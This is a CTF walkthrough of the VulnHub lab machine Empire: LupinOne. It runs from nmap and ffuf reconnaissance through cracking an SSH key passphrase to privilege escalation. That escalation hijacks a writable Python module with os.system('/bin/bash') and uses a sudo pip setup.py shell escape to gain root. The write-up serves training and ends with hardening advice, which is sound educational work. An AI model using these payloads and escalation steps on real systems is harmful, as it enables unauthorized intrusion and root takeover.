<h1 align="center">🐧 Empire: LupinOne — Penetration Testing Walkthrough</h1>
<h3 align="center">From Reconnaissance to Root Access — A Complete CTF Guide</h3>

<p align="center">
  <img src="https://img.shields.io/badge/Penetration-Testing-red" alt="Pentest">
  <img src="https://img.shields.io/badge/Difficulty-Intermediate-orange" alt="Difficulty">
  <img src="https://img.shields.io/badge/Category-CTF-blue" alt="CTF">
  <img src="https://img.shields.io/badge/Status-Completed-green" alt="Completed">
  <img src="https://img.shields.io/badge/Platform-VulnHub-purple" alt="Platform">
</p>

---

## 📖 Table of Contents
- [Overview](#-overview)
- [Objectives](#-objectives)
- [1. Reconnaissance](#1-reconnaissance)
- [2. Directory Enumeration](#2-directory-enumeration)
- [3. SSH Key Extraction](#3-ssh-key-extraction)
- [4. Initial Access](#4-initial-access)
- [5. User Flag](#5-user-flag)
- [6. Privilege Escalation](#6-privilege-escalation)
- [7. Final Privilege Escalation](#7-final-privilege-escalation)
- [Security Recommendations](#-security-recommendations)
- [Tools Used](#-tools-used)

---

## 📋 Overview
This guide documents the complete penetration testing methodology for **Empire: LupinOne**, detailing every step from initial reconnaissance to privilege escalation and flag capture.

## 🎯 Objectives
- Identify the target system and open services
- Enumerate directories and hidden files
- Exploit vulnerabilities to gain initial access
- Escalate privileges to obtain root access
- Capture the flags

---

## 1. Reconnaissance

### 🔎 Network Discovery
Check the IP allocated to the attacking machine and determine the subnet range.

```bash
$ ifconfig
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/s1.png" alt="ifconfig output" width="600"/>
</p>

### 🌐 Host Discovery
Ping sweep to identify live hosts within the subnet.

```bash
$ nmap -sn 192.168.56.0/24
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/s2.png" alt="Nmap ping sweep results" width="600"/>
</p>

### 🛰️ Port Scan
The `-A` flag enables aggressive mode, bundling OS and service detection.

```bash
$ nmap -A 192.168.56.19
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/s3.png" alt="Nmap port scan results" width="600"/>
</p>

**Findings:**

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 8.4p1 Debian 5 |
| 80 | HTTP | Apache httpd 2.4.48 |

---

## 2. Directory Enumeration

Navigating to port 80 (`http://192.168.56.19`), we're greeted by a photo of Arsène.

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/w1.png" alt="Target landing page" width="600"/>
</p>

Checking `robots.txt` reveals a disallowed directory, `~myfiles`:

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/w2.png" alt="robots.txt disallow entry" width="600"/>
</p>

Navigating directly to `/~myfiles` returns a "Not Found" error:

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/w3.png" alt="Not found error for myfiles" width="600"/>
</p>

### 🔍 FFUF Directory Discovery
Use `ffuf` to discover hidden directories on the web server:

```bash
$ ffuf -c -u http://192.168.56.19/~FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/s4.png" alt="ffuf directory discovery" width="600"/>
</p>

### 📁 Finding Hidden Files
A `~secret` directory turns up:

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/w4.png" alt="secret directory found" width="600"/>
</p>

Enumerating further, this time including hidden dotfiles and common extensions:

```bash
$ ffuf -c -ic -u http://192.168.56.19/~secret/.FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -fc 403 -e .txt,.html,.php
```

This surfaces a file, `.mysecret.txt`, which contains an SSH key:

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/s5.png" alt="ffuf finds mysecret.txt" width="600"/>
</p>

Navigating to `http://192.168.56.19/~secret/.mysecret.txt`:

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/w5.png" alt="mysecret.txt contents" width="600"/>
</p>

Copy the key and use CyberChef to decode it — select **From Base58** to reveal the OpenSSH key.

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/w6.png" alt="CyberChef Base58 decode" width="600"/>
</p>

---

## 3. SSH Key Extraction

### 🔐 Converting the SSH Key to a Crackable Hash
```bash
$ ssh2john /home/kali/Desktop/lupin/sshkey.rsa > hashkey
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/s6.png" alt="ssh2john hash extraction" width="600"/>
</p>

### 🔓 Cracking the SSH Key Passphrase
```bash
$ john --wordlist=/usr/share/wordlists/fasttrack.txt hashkey
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/s7.png" alt="John the Ripper cracking the key" width="600"/>
</p>

### ✅ Viewing the Cracked Passphrase
```bash
$ john --show hashkey
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/s8.png" alt="cracked passphrase output" width="600"/>
</p>

---

## 4. Initial Access

### 🔑 SSH Connection
With the key and passphrase in hand:

```bash
$ ssh -i /home/kali/Desktop/lupin/sshkey.rsa icex64@192.168.56.19
Enter passphrase: P@55w0rd!
```

---

## 5. User Flag

```bash
icex64@LupinOne:~$ ls
user.txt
icex64@LupinOne:~$ cat user.txt
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/s9.png" alt="User flag captured" width="600"/>
</p>

---

## 6. Privilege Escalation

### 🕵️ Analyzing Sudo Privileges
`sudo -l` shows:

```
(arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py
```

This means we can run a Python script as user `arsene` without a password.

### 📄 Examining the Script
```bash
icex64@LupinOne:~$ cat /home/arsene/heist.py
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/s10.png" alt="heist.py contents" width="600"/>
</p>

### 🧩 Python Module Hijacking
The script imports the `webbrowser` module — we can exploit this by planting a malicious `webbrowser.py`. First, check for writable files by transferring `linpeas.sh` over a local HTTP server (port 8080, since port 80 is already in use on the target):

```bash
$ python3 -m http.server 8080
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/s11.png" alt="local HTTP server serving linpeas.sh" width="600"/>
</p>

> **Note:** the source document referenced this screenshot as `s11.pngr` — corrected to `.png` here, since `.pngr` isn't a valid extension. Double-check the actual filename in your `Screenshots` folder before publishing.

On the `icex64` terminal:

```bash
icex64@LupinOne:/tmp$ wget 192.168.56.12:8080/linpeas.sh
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/s12.png" alt="downloading linpeas.sh" width="600"/>
</p>

### 🔍 Identifying a Writable Python Module
From the `linpeas` output:

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/s13.png" alt="linpeas output showing writable module" width="600"/>
</p>

### ✍️ Modifying the webbrowser Module
`/usr/lib/python3.9/webbrowser.py` is writable:

```bash
icex64@LupinOne:/tmp$ nano /usr/lib/python3.9/webbrowser.py
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/s14.png" alt="editing webbrowser.py" width="600"/>
</p>

Add the following line to the file:

```python
os.system('/bin/bash')
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/s15.png" alt="malicious payload added to webbrowser.py" width="600"/>
</p>

### ▶️ Executing as User arsene
```bash
icex64@LupinOne:/$ sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/s16.png" alt="shell as user arsene" width="600"/>
</p>

---

## 7. Final Privilege Escalation

### 📦 Abusing pip with Setuid
From user `arsene`, we exploit a `pip` installation running with elevated privileges:

```bash
arsene@LupinOne:/$ TF=$(mktemp -d)
arsene@LupinOne:/$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
arsene@LupinOne:/$ sudo pip install $TF
```

> **Note:** the source document had `os.excl(...)` — corrected to `os.execl(...)` here, since `os.excl` isn't a real Python method. Worth double-checking against your own terminal history before publishing.

### 🏁 Root Access Achieved
```bash
$ id
uid=0(root) gid=0(root) groups=0(root)
$ whoami
root
$ cd /root
$ ls
root.txt
```

<p align="center">
  <img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/s17.png" alt="Root access and root flag" width="600"/>
</p>

🎉 **Root access achieved — flag captured!**

---

## 🔒 Security Recommendations

- **Input Validation** — Implement proper input sanitization to prevent injection-style attacks
- **Password Policies** — Enforce strong password policies for SSH key passphrases
- **Service Hardening** — Disable unnecessary services and ports
- **Module Integrity** — Restrict write permissions on system Python modules
- **Sudo Configuration** — Limit sudo privileges and avoid `NOPASSWD` entries
- **Regular Updates** — Keep all software updated with security patches
- **Log Monitoring** — Implement comprehensive logging and monitoring

---

## 🔧 Tools Used

**🛡️ Network & Service Discovery**
`ifconfig` · `nmap` · `ffuf`

**🔓 Exploitation**
`ssh2john` · John the Ripper · SSH · Python

**🔍 Information Gathering**
`linpeas.sh` · `cat` · `nano` · `wget`

**💻 System Tools**
`sudo` · `mktemp` · `pip` · `os`

---

<p align="center">
  <strong>Documentation created for educational purposes</strong><br>
  All techniques should be practiced only in controlled, authorized environments.
</p>
